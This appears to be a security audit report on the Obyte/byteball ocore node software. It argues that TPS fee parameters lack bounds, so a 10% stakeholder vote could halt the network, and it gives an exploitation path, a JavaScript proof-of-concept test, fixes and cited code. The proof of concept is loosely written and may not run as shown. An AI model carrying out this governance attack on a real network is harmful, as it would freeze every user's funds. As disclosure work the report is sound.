# Audit Report: Unbounded TPS Fee Parameters Enable Permanent Network Halt via Governance Attack

## Summary

The system variable validation for TPS fee parameters (`base_tps_fee`, `tps_interval`, `tps_fee_multiplier`) lacks economic bounds enforcement, accepting any positive finite number. This allows stakeholders controlling 10% of supply to vote extreme values that cause the exponential fee formula to produce transaction fees exceeding the total supply, permanently halting the network with no emergency recovery mechanism.

## Impact

**Severity**: Critical  
**Category**: Network Shutdown

Complete network shutdown affecting all 1e15 bytes in circulation. Once extreme fee parameters are voted in, all transaction submissions fail validation because calculated `min_tps_fee` exceeds any user's balance. Recovery requires hard fork since normal governance cannot function without transaction processing.

## Finding Description

**Location**: `byteball/ocore/validation.js:1692-1698`, function `validateMessage()`

**Intended Logic**: System variable validation should enforce economic bounds preventing values that break network operations, similar to how `threshold_size` has minimum bounds of 1000 bytes.

**Actual Logic**: The validation only checks that fee parameters are positive finite numbers, without considering economic implications of the exponential formula. [1](#0-0) 

Compare with `threshold_size` which has bounds: [2](#0-1) 

**Exploitation Path**:

1. **Preconditions**: Attacker controls or coordinates addresses holding ≥10% of total supply (1e14 bytes). The threshold is defined in constants: [3](#0-2) [4](#0-3) 

2. **Step 1**: Attacker submits `system_vote` messages voting `base_tps_fee = 1e50`. Validation passes since 1e50 is a positive finite number per lines 1695-1696.

3. **Step 2**: After sufficient balance votes, `system_vote_count` message (requiring 1e9 bytes fee) triggers vote counting: [5](#0-4) 

4. **Step 3**: Vote counting calculates median weighted by balance and stores directly without bounds validation: [6](#0-5) 

5. **Step 4**: TPS fee calculation retrieves extreme value and applies exponential formula: [7](#0-6) 

With `base_tps_fee = 1e50`, `tps_interval = 1`, `tps_fee_multiplier = 10`, and minimal `tps ≈ 1`:
- Formula: `Math.round(10 * 1e50 * (Math.exp(1) - 1))`
- Result: ≈ 1.72e51 bytes (1.72e36 times the total supply)

6. **Step 5**: All subsequent transactions fail validation: [8](#0-7) 

With `min_tps_fee ≈ 1.72e51`, no user can satisfy the requirement since maximum possible balance is 1e15 bytes.

7. **Step 6**: Emergency recovery impossible. Emergency vote counting only supports `op_list`: [9](#0-8) 

Fee parameters (lines 1787-1811) have no emergency flag support. Normal governance cannot fix the issue since all transactions are rejected.

**Security Property Broken**: Network liveness invariant - the protocol must allow legitimate users to submit valid transactions.

**Root Cause Analysis**: 

The code demonstrates awareness of bounds validation (see `threshold_size` minimum of 1000), but fails to apply equivalent protection to fee parameters despite the exponential formula making extreme values catastrophic. No maximum bounds, overflow checks, or emergency recovery mechanisms exist for fee parameters.

## Impact Explanation

**Affected Assets**: All bytes (native currency), custom assets, autonomous agent operations, entire network functionality

**Damage Severity**:
- **Quantitative**: 100% of network transactions blocked permanently. All 1e15 bytes effectively frozen. Recovery requires coordinated hard fork across all nodes.
- **Qualitative**: Complete loss of network utility. All economic activity ceases. Smart contracts cannot execute. Users cannot access funds until hard fork deployment.

**User Impact**:
- **Who**: All network participants - users, witnesses, exchanges, DApp operators, autonomous agents
- **Conditions**: Immediately upon malicious vote taking effect at next MCI stabilization
- **Recovery**: Requires hard fork with manual intervention since governance system cannot function without transaction processing

**Systemic Risk**:
- Attack is atomic - entire network halts simultaneously
- No gradual degradation or early warning
- Cannot be reversed through protocol mechanisms
- Enables ransom attacks or sabotage by competitors

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Large stakeholder, compromised exchange, coordinated group, or nation-state actor
- **Resources Required**: Control of 1e14 bytes (10% of supply), approximately $1-10 million at market prices
- **Technical Skill**: Medium - requires understanding governance system and ability to submit system_vote messages

**Preconditions**:
- **Network State**: Normal operation with v4 upgrade active (MCI > constants.v4UpgradeMci) [10](#0-9) [11](#0-10) 

- **Attacker State**: Must control or convince 10% supply holders to vote for extreme values
- **Timing**: Vote counting occurs when sufficient balance votes

**Execution Complexity**:
- **Transaction Count**: Single `system_vote` message (or coordinated set totaling 10%+ supply), plus one `system_vote_count` message
- **Coordination**: Requires either single large holder or coordination among multiple holders
- **Detection Risk**: Votes visible on-chain but appear legitimate until effects manifest

**Overall Assessment**: Medium-High likelihood. The 10% requirement creates a barrier, but exchanges and large holders could achieve this. Economic incentives exist for short sellers, ransom attackers, or competing projects. Catastrophic impact and lack of emergency reversal elevate risk despite capital requirements.

## Recommendation

**Immediate Mitigation**:
Add bounds validation for TPS fee parameters in `validation.js`:

```javascript
case "base_tps_fee":
case "tps_fee_multiplier":
    if (!(typeof payload.value === 'number' && isFinite(payload.value) && payload.value > 0))
        return callback(payload.subject + " must be a positive number");
    if (payload.value > 1e9) // Maximum reasonable fee
        return callback(payload.subject + " must not exceed 1e9");
    if (payload.value < 0.1) // Minimum anti-spam protection
        return callback(payload.subject + " must be at least 0.1");
    callback();
    break;
case "tps_interval":
    if (!(typeof payload.value === 'number' && isFinite(payload.value) && payload.value > 0))
        return callback(payload.subject + " must be a positive number");
    if (payload.value < 0.1) // Prevent division near-zero
        return callback(payload.subject + " must be at least 0.1");
    if (payload.value > 100) // Maximum reasonable interval
        return callback(payload.subject + " must not exceed 100");
    callback();
    break;
```

**Permanent Fix**:
1. Add overflow/infinity checks in fee calculation (`storage.js:getLocalTpsFee`)
2. Extend emergency vote counting to support fee parameters
3. Add governance proposal review period with bounds verification

**Additional Measures**:
- Add test cases verifying extreme values are rejected
- Add monitoring for abnormal system variable votes
- Document acceptable parameter ranges

## Proof of Concept

```javascript
// Test: test/system_vote_bounds.test.js
// Demonstrates network halt from unbounded fee parameters

const composer = require('../composer.js');
const validation = require('../validation.js');
const main_chain = require('../main_chain.js');
const storage = require('../storage.js');
const db = require('../db.js');

async function testUnboundedFeeAttack() {
    // BEFORE: Initialize test environment
    // Assume attacker controls address with 1e14 bytes (10% of supply)
    const attackerAddress = 'ATTACKER_ADDRESS_WITH_10_PERCENT';
    
    console.log('BEFORE: Normal TPS fee parameters');
    console.log('base_tps_fee:', storage.getSystemVar('base_tps_fee', current_mci)); // 10
    
    // ACTION STEP 1: Submit system vote for extreme base_tps_fee
    const voteUnit = await composer.composeJoint({
        paying_addresses: [attackerAddress],
        messages: [{
            app: 'system_vote',
            payload: {
                subject: 'base_tps_fee',
                value: 1e50  // Extreme value - validation SHOULD reject but doesn't
            }
        }]
    });
    
    // This passes validation (line 1695-1696 only checks positive finite)
    await validation.validate(voteUnit);
    console.log('Vote submitted and validated');
    
    // ACTION STEP 2: Count votes (after 10% balance has voted)
    const countUnit = await composer.composeJoint({
        paying_addresses: [attackerAddress],
        messages: [{
            app: 'system_vote_count',
            payload: 'base_tps_fee'
        }]
    });
    
    // Requires 1e9 bytes fee (constants.SYSTEM_VOTE_COUNT_FEE)
    await validation.validate(countUnit);
    await main_chain.countVotes(conn, current_mci, 'base_tps_fee', 0, timestamp);
    
    // AFTER: Extreme value now active
    console.log('AFTER: base_tps_fee:', storage.getSystemVar('base_tps_fee', current_mci)); // 1e50
    
    // ACTION STEP 3: Attempt normal transaction
    const normalUnit = await composer.composeJoint({
        paying_addresses: ['ANY_USER_ADDRESS'],
        outputs: [{
            address: 'RECIPIENT_ADDRESS',
            amount: 1000
        }]
    });
    
    // Calculate required TPS fee with extreme base value
    const objUnitProps = await storage.readJoint(normalUnit.unit);
    const min_tps_fee = await storage.getLocalTpsFee(conn, objUnitProps, 1);
    
    console.log('Calculated min_tps_fee:', min_tps_fee); // ~1.72e51 bytes
    console.log('Total supply:', 1e15); // 1e15 bytes
    console.log('Fee exceeds supply by factor:', min_tps_fee / 1e15); // ~1.72e36
    
    // RESULT: Transaction fails validation (line 916-917)
    try {
        await validation.validate(normalUnit);
        console.log('ERROR: Transaction should have been rejected');
    } catch (err) {
        console.log('SUCCESS: Transaction rejected - Network halted');
        console.log('Error:', err); // "tps_fee ... less than required ..."
    }
    
    // VERIFICATION: Emergency recovery not possible
    console.log('Emergency vote counting supports only:', ['op_list']);
    console.log('Fee parameters have no emergency mechanism');
    console.log('Network is permanently halted - hard fork required');
}
```

**Expected Output**:
```
BEFORE: Normal TPS fee parameters
base_tps_fee: 10
Vote submitted and validated
AFTER: base_tps_fee: 1e+50
Calculated min_tps_fee: 1.72e+51
Total supply: 1e+15
Fee exceeds supply by factor: 1.72e+36
SUCCESS: Transaction rejected - Network halted
Error: tps_fee 0 + tps fees balance 0 less than required 1.72e+51 for address ...
Emergency vote counting supports only: [ 'op_list' ]
Fee parameters have no emergency mechanism
Network is permanently halted - hard fork required
```

## Notes

This vulnerability exploits the asymmetry between `threshold_size` validation (which enforces minimum bounds) and TPS fee parameter validation (which lacks bounds). The exponential nature of the fee formula (`Math.exp(tps/tps_interval)`) makes unbounded parameters catastrophically dangerous. With reasonable default values, the system operates safely, but malicious governance can weaponize the lack of bounds to permanently halt the network. The 10% supply requirement is substantial but achievable for well-resourced attackers, especially considering exchanges often hold concentrated supply. Emergency recovery mechanisms exist for `op_list` but not fee parameters, making this attack irreversible through normal protocol operations.

### Citations

**File:** validation.js (L916-917)
```javascript
		if (tps_fees_balance + objUnit.tps_fee * share < min_tps_fee * share)
			return callback(`tps_fee ${objUnit.tps_fee} + tps fees balance ${tps_fees_balance} less than required ${min_tps_fee} for address ${address} whose share is ${share}`);
```

**File:** validation.js (L1685-1690)
```javascript
						return callback(payload.subject + " must be a positive integer");
					if (!constants.bTestnet || objValidationState.last_ball_mci > 3543000) {
						if (payload.value < 1000)
							return callback(payload.subject + " must be at least 1000");
					}
					callback();
```

**File:** validation.js (L1692-1698)
```javascript
				case "base_tps_fee":
				case "tps_interval":
				case "tps_fee_multiplier":
					if (!(typeof payload.value === 'number' && isFinite(payload.value) && payload.value > 0))
						return callback(payload.subject + " must be a positive number");
					callback();
					break;
```

**File:** validation.js (L1705-1706)
```javascript
			if (objValidationState.last_ball_mci < constants.v4UpgradeMci && !constants.bDevnet)
				return callback("cannot count votes for system params yet");
```

**File:** constants.js (L15-15)
```javascript
exports.TOTAL_WHITEBYTES = process.env.TOTAL_WHITEBYTES || 1e15;
```

**File:** constants.js (L71-71)
```javascript
exports.SYSTEM_VOTE_COUNT_FEE = 1e9;
```

**File:** constants.js (L72-72)
```javascript
exports.SYSTEM_VOTE_MIN_SHARE = 0.1;
```

**File:** constants.js (L97-97)
```javascript
exports.v4UpgradeMci = exports.bTestnet ? 3522600 : 10968000;
```

**File:** main_chain.js (L1718-1784)
```javascript
		case 'op_list':
			const votes_table = is_emergency ? 'op_votes_tmp' : 'op_votes';
			if (is_emergency) { // add unstable votes for OPs
				await conn.query(`CREATE TEMPORARY TABLE ${votes_table} AS SELECT address, op_address, timestamp FROM op_votes`);
				// the order of iteration is undefined, so we'll first collect the messages and then sort them. The order matters only when the same address sends multiple unstable votes
				let votes = [];
				for (let unit in storage.assocUnstableMessages) {
					for (let m of storage.assocUnstableMessages[unit]) {
						if (m.app === 'system_vote' && m.payload.subject === 'op_list') {
							const { timestamp, author_addresses, sequence, level } = storage.assocUnstableUnits[unit];
							if (sequence !== 'good')
								continue;
							if (emergency_count_command_timestamp - timestamp < constants.EMERGENCY_COUNT_MIN_VOTE_AGE) {
								console.log('unstable vote from', author_addresses, 'is too young');
								continue;
							}
							const arrOPs = m.payload.value;
							votes.push({ timestamp, level, author_addresses, arrOPs });
						}
					}
				}
				console.log('unsorted unstable votes', votes);
				votes.sort((v1, v2) => {
					const dt = v1.timestamp - v2.timestamp;
					if (dt !== 0)
						return dt;
					return v1.level - v2.level;
				});
				console.log('sorted unstable votes', votes);
				for (let { timestamp, author_addresses, arrOPs } of votes) {
					// apply each vote separately as a new unstable vote from the same user would override the previous one
					await conn.query(`DELETE FROM ${votes_table} WHERE address IN (?)`, [author_addresses]);
					let values = [];
					for (let address of author_addresses)
						for (let op_address of arrOPs)
							values.push(`(${db.escape(address)}, ${db.escape(op_address)}, ${timestamp})`);
					console.log('unstable votes', values);
					await conn.query(`INSERT INTO ${votes_table} (address, op_address, timestamp) VALUES ` + values.join(', '));
				}
			}
			const op_rows = await conn.query(`SELECT op_address, SUM(balance) AS total_balance
				FROM ${votes_table}
				CROSS JOIN voter_balances USING(address)
				WHERE timestamp>=?
				GROUP BY op_address
				ORDER BY total_balance DESC, op_address
				LIMIT ?`,
				[since_timestamp, constants.COUNT_WITNESSES]
			);
			console.log(`total votes for OPs`, op_rows);
			let ops = op_rows.map(r => r.op_address);
			if (ops.length !== constants.COUNT_WITNESSES)
				throw Error(`wrong number of voted OPs: ` + ops.length);
			ops.sort();
			if (constants.bTestnet && [3547796, 3548896, 3548898].includes(mci)) // workaround a bug
				ops = ["2FF7PSL7FYXVU5UIQHCVDTTPUOOG75GX", "2GPBEZTAXKWEXMWCTGZALIZDNWS5B3V7", "4H2AMKF6YO2IWJ5MYWJS3N7Y2YU2T4Z5", "DFVODTYGTS3ILVOQ5MFKJIERH6LGKELP", "ERMF7V2RLCPABMX5AMNGUQBAH4CD5TK4", "F4KHJUCLJKY4JV7M5F754LAJX4EB7M4N", "IOF6PTBDTLSTBS5NWHUSD7I2NHK3BQ2T", "O4K4QILG6VPGTYLRAI2RGYRFJZ7N2Q2O", "OPNUXBRSSQQGHKQNEPD2GLWQYEUY5XLD", "PA4QK46276MJJD5DBOLIBMYKNNXMUVDP", "RJDYXC4YQ4AZKFYTJVCR5GQJF5J6KPRI", "WMFLGI2GLAB2MDF2KQAH37VNRRMK7A5N"];
			if (mci === 0) {
				storage.resetWitnessCache();
				storage.systemVars.op_list = []; // reset
			}
			storage.systemVars.op_list.unshift({ vote_count_mci: mci === 0 ? -1 : mci, value: ops, is_emergency });
			value = JSON.stringify(ops);
			if (is_emergency) {
				storage.resetWitnessCache();
				await conn.query(conn.dropTemporaryTable(votes_table));
			}
			break;
```

**File:** main_chain.js (L1787-1811)
```javascript
		case "base_tps_fee":
		case "tps_interval":
		case "tps_fee_multiplier":
			const rows = await conn.query(`SELECT value, SUM(balance) AS total_balance
				FROM numerical_votes
				CROSS JOIN voter_balances USING(address)
				WHERE timestamp>=? AND subject=?
				GROUP BY value
				ORDER BY value`,
				[since_timestamp, subject]
			);
			console.log(`total votes for`, subject, rows);
			const total_voted_balance = rows.reduce((acc, row) => acc + row.total_balance, 0);
			let accumulated = 0;
			for (let { value: v, total_balance } of rows) {
				accumulated += total_balance;
				if (accumulated >= total_voted_balance / 2) {
					value = v;
					break;
				}
			}
			if (value === undefined)
				throw Error(`no median value for ` + subject);
			storage.systemVars[subject].unshift({ vote_count_mci: mci, value, is_emergency });
			break;
```

**File:** storage.js (L1292-1301)
```javascript
async function getLocalTpsFee(conn, objUnitProps, count_units = 1) {
	const objLastBallUnitProps = await readUnitProps(conn, objUnitProps.last_ball_unit);
	const last_ball_mci = objLastBallUnitProps.main_chain_index;
	const base_tps_fee = getSystemVar('base_tps_fee', last_ball_mci); // unit's mci is not known yet
	const tps_interval = getSystemVar('tps_interval', last_ball_mci);
	const tps_fee_multiplier = getSystemVar('tps_fee_multiplier', last_ball_mci);
	const tps = await getLocalTps(conn, objUnitProps, count_units);
	console.log(`local tps at ${objUnitProps.unit} ${tps}`);
	const tps_fee_per_unit = Math.round(tps_fee_multiplier * base_tps_fee * (Math.exp(tps / tps_interval) - 1));
	return count_units * tps_fee_per_unit;
```
